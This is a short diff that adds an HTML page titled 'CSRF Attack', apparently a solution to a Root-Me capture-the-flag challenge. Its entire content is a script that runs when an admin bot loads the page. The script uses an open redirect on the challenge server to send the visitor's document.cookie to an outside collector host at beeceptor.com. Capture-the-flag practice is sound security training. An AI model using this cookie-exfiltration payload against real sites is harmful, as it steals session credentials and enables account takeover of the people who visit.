@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <script>
+    // This will execute when the admin bot visits the page
+    fetch('http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/?cookie=' + encodeURIComponent(document.cookie))
+    </script>
+</body>
+</html>
